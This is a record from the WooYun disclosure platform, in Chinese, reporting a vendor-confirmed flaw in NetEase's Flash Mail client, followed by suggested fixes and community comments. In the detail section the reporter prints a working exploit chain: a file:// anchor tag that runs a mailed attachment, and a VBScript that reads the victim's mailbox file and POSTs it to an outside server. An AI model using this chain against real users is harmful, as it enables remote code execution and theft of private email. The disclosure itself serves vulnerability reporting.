{"id": 87673, "wybug_id": "wooyun-2016-0182994", "wybug_title": "网易闪电邮客户端设计缺陷可导致远程种马/邮件窃取                                      ", "wybug_corp": "网易", "wybug_author": "数据流", "wybug_date": "2016-03-10 16:04", "wybug_open_date": "2016-06-12 13:40", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["客户端安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-17：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-05-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-12：\t细节向公众公开  简要描述： this defect is so LOW! 详细说明：  \n\n首先出现的问题重点我之前提过http://**.**.**.**/bugs/wooyun-2010-0146493是很多邮件客户端都存在的低级问题这漏洞是在没有客户端XSS的情况下可命令执行的漏洞，当然实际利用要结合社工。\n\na标签没有对file://进行过滤，可能会导致一些安全问题。但是就这样只能执行一些简单的程序，很鸡肋，但只要结合闪电邮的另一个缺陷就能实现真正的命令执行。\n\n当客户端打开含有图片附件的邮件时，会在当前邮件的目录生成出来。这样好像没什么不对，但是这样的话结合第一个缺陷就能执行你传过来的附件了。发送邮件的时候添加一个图片附件，而那图片就是你的木马\n\n然后再邮件正本加上a标签\n<a href=\"attachs\\cmd.exe\">Click</a>\n点击就执行了很弱智客户端会生成到当前目录和attachs目录。如果不想种马可以直接窃取邮件，优雅地利用，直接写个vbs脚本即可。所有获取的到邮件都存在 \\安装目录\\account\\邮箱地址\\in.mboxvbs代码:\nDim httpSet http = CreateObject(\"Msxml2.ServerXMLHTTP\")set fso=createobject(\"scripting.filesystemobject\")path = fso.GetFolder(\".\").Path&\"/../../../account/victim的邮箱地址/in.mbox\"fso.CopyFile path,\"mail.mbox\",False '文件被客户端占用,Adodb.Stream不能读取要先copySet stm = CreateObject(\"Adodb.Stream\")stm.Type = 2stm.mode = 3stm.charset = \"utf-8\" 'fso不支持utf8要用Adodb.Stream读取stm.Openstm.LoadFromFile \"mail.mbox\"mail=stm.readtexthttp.open \"POST\",\"**.**.**.**/test.php\", Falsehttp.setRequestHeader \"Content-Type\",\"application/x-www-form-urlencoded\"http.send \"mail=\"&mail\n   漏洞证明：  victim点击后会自动执行\n\nURLdecode后就可以看到整个邮件的请求\n\n结合一些社工手段。\n\n\n\n超链接的欺骗   修复方案：  1 超链接对file://要做处理2 附件路径要随机   版权声明：转载请注明来源 数据流@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-03-14 13:37 厂商回复： 您好，确认漏洞存在，产品部门将着手客户端的修复工作。感谢您对网易产品的关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-10 16:09 |    \t\tAasron \t\t\t( 普通白帽子  |\t\t\t        Rank:871 漏洞数:158        | raw_input(\"你知道我要输入什么？\"))\t\t \n  屠龙宝刀，点击你说送不送？    \n     2016-03-10 16:25 |    \t\tMieless \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:10        | 我是来打酱油的。)\t\t \n  this defect is so LOUSY    \n     2016-03-10 16:26 |    \t\t奈何彼岸 \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:49        | 乌云一下你就知道)\t\t \n  前排    \n     2016-03-10 16:36 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  mark    \n     2016-03-10 17:16 |    \t\tTaro \t\t\t( 普通白帽子  |\t\t\t        Rank:335 漏洞数:83        | 走向最远的方向，哪怕前路迷茫；抱着最大的...)\t\t \n  这个不打雷么    \n     2016-03-10 17:23 |    \t\t数据流  \t\t\t( 普通白帽子  |\t\t\t        Rank:817 漏洞数:100        | 没关系啊，我们还有音乐)\t\t \n  @Taro 这个漏洞很弱智。。    \n     2016-03-10 17:28 |    \t\tTaro \t\t\t( 普通白帽子  |\t\t\t        Rank:335 漏洞数:83        | 走向最远的方向，哪怕前路迷茫；抱着最大的...)\t\t \n  @数据流 等着看看如何弱智，没有研究过网易的邮箱客户端    \n     2016-03-11 10:47 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:257 漏洞数:84        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  邮箱流    \n     2016-05-08 13:44 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1662 漏洞数:191        | 学无止境)\t\t \n  @数据流 越容易越弱智的漏洞危害越大，说明小白也能利用。    \n     2016-05-08 14:00 |    \t\t数据流  \t\t\t( 普通白帽子  |\t\t\t        Rank:817 漏洞数:100        | 没关系啊，我们还有音乐)\t\t \n  @梧桐雨 哈哈是啊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}